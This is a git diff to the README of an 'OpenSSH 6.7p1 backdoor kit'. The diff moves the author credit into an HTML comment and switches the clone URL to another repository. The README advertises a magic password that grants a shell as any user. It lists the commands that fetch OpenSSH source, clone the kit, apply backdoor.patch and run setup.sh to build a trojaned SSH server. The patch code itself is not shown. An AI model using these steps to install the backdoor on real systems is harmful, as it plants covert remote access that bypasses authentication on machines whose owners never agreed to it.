@@ -1,7 +1,8 @@
 # OpenSSH 6.7p1 backdoor kit
 
-## coded by bl0w. bl0w@koresec.org
-
+<!--
+coded by bl0w. bl0w@koresec.org
+-->
 ## Features:
 
  - magic password to get shell with any user (encrypted or no)
@@ -19,7 +20,7 @@ $ apt-get install -y libpam0g-dev
 $ wget http://www.mirrorservice.org/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz
 $ tar -xzvf openssh-6.7p1.tar.gz
 $ cd openssh-6.7p1
-$ git clone https://github.com/jivoi/openssh-backdoor-kit.git
+$ git clone https://github.com/RaagulVigneshR/openssh-backdoor-kit.git
 $ cp -v openssh-backdoor-kit/* ./
 $ patch -p1 < backdoor.patch
 $ sh setup.sh
